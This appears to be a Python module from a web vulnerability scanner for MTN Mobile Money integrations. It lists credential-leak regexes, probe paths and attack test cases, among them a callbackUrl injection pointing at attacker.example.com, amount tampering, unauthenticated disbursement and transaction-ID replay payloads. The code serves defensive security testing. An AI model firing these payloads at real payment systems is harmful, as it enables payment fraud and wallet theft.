"""
mtn_momo.py — MTN Mobile Money (MoMo) Provider

MTN MoMo is the dominant mobile payment platform in Uganda, with ~10M+
active wallets. It's also the most integrated platform in Ugandan fintech,
appearing in everything from SACCO systems to government portals.

API versions supported:
  - MTN MoMo API (Sandbox + Production): api.mtn.com/collection/
  - Legacy Yo! Uganda MTN integration
  - Africa's Talking MTN gateway
  - Direct USSD callback integrations

Known vulnerability classes specific to MTN MoMo:
  1. Subscription key in client-side code (extremely common in EA)
  2. X-Reference-Id reuse — transaction ID not UUID-validated
  3. Callback URL injection — callbackUrl not validated against whitelist
  4. Provisional vs. final status polling — race between PENDING and SUCCESS
  5. Collection API — amount not validated server-side before API call
  6. Disbursement API — requestToPay used without verifying recipient identity
  7. OAuth2 token caching — tokens shared across users in session storage
  8. Sandbox to production key confusion (same codebase, wrong env check)
"""

from __future__ import annotations

import re
from typing import Dict, List

from core.context.mobile_money.base_provider import (
    BaseMobileMoneyProvider,
    MMVulnTest,
    registry,
)


class MTNMoMoProvider(BaseMobileMoneyProvider):
    """
    MTN Mobile Money vulnerability detection provider.
    Covers both the official MoMo API and common integration patterns.
    """

    # ── Provider identity ──────────────────────────────────────────────────────

    @property
    def name(self) -> str:
        return "MTN Mobile Money (MoMo)"

    @property
    def provider_id(self) -> str:
        return "mtn_momo"

    # ── Detection patterns ─────────────────────────────────────────────────────

    @property
    def credential_patterns(self) -> List[re.Pattern]:
        return [
            # MTN MoMo API subscription key (32-char hex)
            re.compile(r"Ocp-Apim-Subscription-Key[\s:=]+[0-9a-f]{32}", re.IGNORECASE),
            re.compile(r"subscriptionKey[\s:=\"']+[0-9a-f]{32}", re.IGNORECASE),
            re.compile(r"primaryKey[\s:=\"']+[0-9a-f]{32}", re.IGNORECASE),

            # MoMo user/API user credentials
            re.compile(r"X-Reference-Id[\s:=\"']+[0-9a-f-]{36}", re.IGNORECASE),
            re.compile(r"momo.*apiuser|apiUser.*momo", re.IGNORECASE),
            re.compile(r"momoApiKey[\s:=\"']+", re.IGNORECASE),

            # Base64 encoded basic auth (common MoMo OAuth2 pattern)
            re.compile(r"Authorization: Basic [A-Za-z0-9+/=]{40,}", re.IGNORECASE),

            # Sandbox vs production confusion
            re.compile(r"sandbox\.momodeveloper\.mtn\.com", re.IGNORECASE),
            re.compile(r"api\.mtn\.com/collection.*sandbox|sandbox.*collection", re.IGNORECASE),

            # Common JS variable names for MoMo keys in client code
            re.compile(r"var\s+momoKey\s*=|const\s+momoKey\s*=|momoKey\s*:", re.IGNORECASE),
            re.compile(r"MTN_API_KEY|MTN_SECRET|MOMO_KEY|mtn_momo_key", re.IGNORECASE),

            # Environment variables accidentally echoed
            re.compile(r"MTN_COLLECTION_PRIMARY_KEY|MTN_COLLECTION_SECONDARY_KEY", re.IGNORECASE),
        ]

    @property
    def endpoint_patterns(self) -> List[re.Pattern]:
        return [
            # Official MTN MoMo API
            re.compile(r"api\.mtn\.com/(collection|disbursement|remittance)", re.IGNORECASE),
            re.compile(r"sandbox\.momodeveloper\.mtn\.com", re.IGNORECASE),
            re.compile(r"momodeveloper\.mtn", re.IGNORECASE),

            # Common integration path patterns in EA apps
            re.compile(r"/mtn[-_]?momo|/momo[-_]?payment|/mtn[-_]?pay", re.IGNORECASE),
            re.compile(r"/api/momo|/mobile[-_]?money/mtn|/mtn/callback", re.IGNORECASE),
            re.compile(r"/payment/mtn|/checkout/mtn|/mtn/notify", re.IGNORECASE),

            # USSD-based MTN integration paths
            re.compile(r"/ussd/mtn|/mtn/ussd", re.IGNORECASE),

            # Africa's Talking MTN gateway
            re.compile(r"africastalking.*mtn|mtn.*africastalking", re.IGNORECASE),
        ]

    # ── Provider-specific vulnerability tests ──────────────────────────────────

    @property
    def provider_tests(self) -> List[MMVulnTest]:
        return [

            # Subscription key exposure
            MMVulnTest(
                test_id="MTN-001",
                name="MoMo Subscription Key in JavaScript",
                description=(
                    "Check if the MTN MoMo subscription key is embedded in "
                    "client-side JavaScript files or HTML source."
                ),
                vuln_class="sensitive_data",
                severity="critical",
                http_method="GET",
                endpoint_pattern=r"\.(js|jsx|ts|tsx)$|/static/|/assets/",
                payload="",
                payload_parameter="",
                evidence_pattern=r"Ocp-Apim-Subscription-Key|subscriptionKey|primaryKey.*[0-9a-f]{32}",
                provider="mtn_momo",
            ),

            # Callback URL injection
            MMVulnTest(
                test_id="MTN-002",
                name="MoMo callbackUrl Injection",
                description=(
                    "Inject a malicious callback URL into the requestToPay API call. "
                    "If accepted, MoMo payment notifications will go to attacker's server."
                ),
                vuln_class="misconfig",
                severity="high",
                http_method="POST",
                endpoint_pattern=r"/collection|/requestToPay|/momo/pay|/mtn/pay",
                payload='{"callbackUrl": "https://attacker.example.com/steal"}',
                payload_parameter="body",
                evidence_pattern=r"referenceId|transactionId|202|Accepted",
                false_positive_check=r"invalid.*callback|callback.*not allowed|whitelist",
                provider="mtn_momo",
            ),

            # X-Reference-Id reuse / predictability
            MMVulnTest(
                test_id="MTN-003",
                name="X-Reference-Id Predictable / Reusable",
                description=(
                    "Test if the X-Reference-Id (transaction UUID) is sequential or "
                    "can be reused to query another user's transaction status."
                ),
                vuln_class="idor",
                severity="high",
                http_method="GET",
                endpoint_pattern=r"/collection/v1_0/requesttopay|/momo/status",
                payload="00000000-0000-0000-0000-000000000001",
                payload_parameter="X-Reference-Id",
                evidence_pattern=r"amount|payer|status|financialTransactionId",
                false_positive_check=r"not found|404|invalid.*reference",
                provider="mtn_momo",
            ),

            # Sandbox environment in production
            MMVulnTest(
                test_id="MTN-004",
                name="Sandbox Environment in Production",
                description=(
                    "Detect use of MTN MoMo sandbox environment keys/URLs in a "
                    "production application. Sandbox transactions are not real but "
                    "app may treat them as confirmed payments."
                ),
                vuln_class="misconfig",
                severity="high",
                http_method="GET",
                endpoint_pattern=r".*",  # Check all pages
                payload="",
                payload_parameter="",
                evidence_pattern=r"sandbox\.momodeveloper|momodeveloper.*sandbox|SANDBOX.*momo",
                provider="mtn_momo",
            ),

            # OAuth2 token endpoint brute force
            MMVulnTest(
                test_id="MTN-005",
                name="MoMo OAuth2 Token Endpoint Without Rate Limiting",
                description=(
                    "Test if the /token endpoint for MoMo OAuth2 is rate-limited. "
                    "Without rate limiting, API credentials can be brute-forced."
                ),
                vuln_class="misconfig",
                severity="medium",
                http_method="POST",
                endpoint_pattern=r"/collection/token|/momo/token|/oauth/token.*momo",
                payload='{"grant_type": "client_credentials"}',
                payload_parameter="body",
                evidence_pattern=r"access_token|token_type",
                provider="mtn_momo",
            ),

            # requestToPay without server-side amount check
            MMVulnTest(
                test_id="MTN-006",
                name="MoMo Amount Not Server-Validated Before API Call",
                description=(
                    "Modify the amount in the initiate payment request. If the "
                    "app calls MTN MoMo API with the client-supplied amount rather "
                    "than the order total, underpayment is possible."
                ),
                vuln_class="sqli",   # Logic flaw via parameter tampering
                severity="critical",
                http_method="POST",
                endpoint_pattern=r"/momo/initiate|/mtn/initiate|/payment/initiate.*momo",
                payload="1",
                payload_parameter="amount",
                evidence_pattern=r"requestId|reference|transactionId|202",
                false_positive_check=r"amount.*mismatch|invalid.*amount",
                provider="mtn_momo",
            ),

            # Disbursement API exposed without strict auth
            MMVulnTest(
                test_id="MTN-007",
                name="MoMo Disbursement API Accessible",
                description=(
                    "Check if the MoMo Disbursement API (for sending money out) "
                    "is accessible from the web frontend without additional auth. "
                    "This API should be server-side only."
                ),
                vuln_class="auth_bypass",
                severity="critical",
                http_method="POST",
                endpoint_pattern=r"/disbursement|/transfer/momo|/momo/transfer",
                payload='{"amount":"100","currency":"UGX","externalId":"TEST","payee":{"partyIdType":"MSISDN","partyId":"256700000000"}}',
                payload_parameter="body",
                evidence_pattern=r"202|Accepted|transferId|referenceId",
                false_positive_check=r"401|403|unauthorized|forbidden",
                provider="mtn_momo",
            ),

            # Collection API — missing idempotency key validation
            MMVulnTest(
                test_id="MTN-008",
                name="Duplicate Payment via X-Reference-Id Replay",
                description=(
                    "Replay a completed payment request with the same X-Reference-Id. "
                    "MoMo API should reject duplicates; if the integration layer "
                    "doesn't check, a single payment may credit an order multiple times."
                ),
                vuln_class="misconfig",
                severity="high",
                http_method="POST",
                endpoint_pattern=r"/momo/pay|/collection/requestToPay|/mtn/collection",
                payload='{"amount":"500","currency":"UGX","externalId":"REPLAY_TEST"}',
                payload_parameter="body",
                evidence_pattern=r"202|Accepted|already processed",
                provider="mtn_momo",
            ),
        ]

    # ── Probe endpoints ────────────────────────────────────────────────────────

    def get_probe_endpoints(self) -> List[Dict[str, str]]:
        return [
            {"path": "/momo", "method": "GET", "description": "MTN MoMo root"},
            {"path": "/api/momo", "method": "GET", "description": "MoMo API root"},
            {"path": "/mtn/callback", "method": "GET", "description": "MoMo callback"},
            {"path": "/mtn/ipn", "method": "GET", "description": "MoMo IPN"},
            {"path": "/momo/status", "method": "GET", "description": "Transaction status"},
            {"path": "/collection/v1_0/requesttopay", "method": "POST", "description": "Collection API"},
            {"path": "/disbursement/v1_0/transfer", "method": "POST", "description": "Disbursement API"},
        ]

    # ── Finding context ────────────────────────────────────────────────────────

    def build_finding_context(self, test: MMVulnTest, url: str) -> dict:
        ctx = super().build_finding_context(test, url)
        ctx.update({
            "mtn_momo_specific": True,
            "api_version": self._detect_api_version(url),
            "affects_wallets": True,
            "data_at_risk": [
                "MTN wallet balances",
                "Transaction histories",
                "MSISDN (phone numbers)",
                "KYC data linked to MoMo accounts",
            ],
            "attack_impact": (
                "Exploitation could enable fraudulent transactions, "
                "account balance theft, or financial data exposure affecting "
                "MTN MoMo users in Uganda."
            ),
        })
        return ctx

    @staticmethod
    def _detect_api_version(url: str) -> str:
        if "v1_0" in url:
            return "v1.0"
        if "v2_0" in url or "v2" in url:
            return "v2.0"
        return "unknown"


# ── MTN MoMo-specific credential patterns (for sensitive_data detector) ────────

MTN_MOMO_SECRET_PATTERNS: List[Dict[str, str]] = [
    {
        "name": "MTN MoMo Subscription Key",
        "pattern": r"[0-9a-f]{32}",
        "context_pattern": r"(subscription[_-]?key|primary[_-]?key|secondary[_-]?key)[\s:=\"']+[0-9a-f]{32}",
        "severity": "critical",
        "description": "MTN MoMo API subscription key exposed",
    },
    {
        "name": "MTN MoMo API User ID",
        "pattern": r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
        "context_pattern": r"(apiUser|api_user|x-reference-id)[\s:=\"']+[0-9a-f-]{36}",
        "severity": "high",
        "description": "MTN MoMo API User ID exposed",
    },
    {
        "name": "MTN MoMo Bearer Token",
        "pattern": r"Bearer [A-Za-z0-9\-_\.]{50,}",
        "context_pattern": r"Authorization:\s*Bearer [A-Za-z0-9\-_\.]{50,}",
        "severity": "critical",
        "description": "Live MTN MoMo OAuth2 Bearer token exposed",
    },
    {
        "name": "MTN Environment Variable",
        "pattern": r"MTN_(COLLECTION|DISBURSEMENT|REMITTANCE)_(PRIMARY|SECONDARY|API)_KEY",
        "context_pattern": r"MTN_(COLLECTION|DISBURSEMENT)_(PRIMARY|SECONDARY)_KEY\s*=\s*[^\s]{10,}",
        "severity": "critical",
        "description": "MTN MoMo API key in environment variable dump",
    },
]


# ── Register with global registry ─────────────────────────────────────────────
mtn_momo_provider = MTNMoMoProvider()
registry.register(mtn_momo_provider)